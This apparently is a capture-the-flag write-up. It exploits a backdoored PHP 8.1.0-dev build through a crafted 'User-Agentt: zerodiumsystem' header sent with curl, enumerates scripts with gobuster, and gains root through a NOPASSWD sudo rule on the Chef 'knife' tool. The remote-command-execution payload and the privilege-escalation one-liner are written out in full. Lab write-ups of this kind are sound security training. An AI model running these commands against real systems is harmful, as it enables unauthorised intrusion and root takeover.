### 🎯 Goal:

- Gain **initial code execution** via a known **backdoored version of PHP**
    
- Escalate privileges to **root** via a misconfigured `sudo` rule
    

---

### 🔍 Step 1: Identify Backdoored PHP

#### ✅ Evidence:

- HTTP response included:
    
    `X-Powered-By: PHP/8.1.0-dev`
    
- This version had a **backdoor introduced via Git compromise** — if present, it evaluates code passed in the header:
    `User-Agentt: zerodiumsystem("id")`
    

#### 💻 Command Used:

`curl -i -H 'User-Agentt: zerodiumsystem("id")' http://<target>/index.php`

> ✅ This should trigger **remote command execution**, but only works if the actual backdoored build is running and parsing the request.

---

### 🔍 Step 2: Enumerate Accessible PHP Scripts

#### Tool Used:

`gobuster dir -u http://<target>/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x php`

> ✅ This found `/index.php` as a valid script to target with your payload.

---

### 🔒 Step 3: Local Enumeration as `james`

You gained a foothold as user `james`. Next, you checked what commands `james` could run as root.

#### 🔐 Command:

`sudo -l`

> ✅ This showed:

`(ALL) NOPASSWD: /usr/bin/knife`

---

### 🚀 Step 4: Privilege Escalation via `/usr/bin/knife`

`knife` is a **Ruby-based Chef utility** — and it supports running arbitrary Ruby code.

#### 🔓 Command:

`sudo /usr/bin/knife exec -E 'exec "/bin/bash"'`

> ✅ This executes a bash shell as root via Ruby's `exec` function.

---
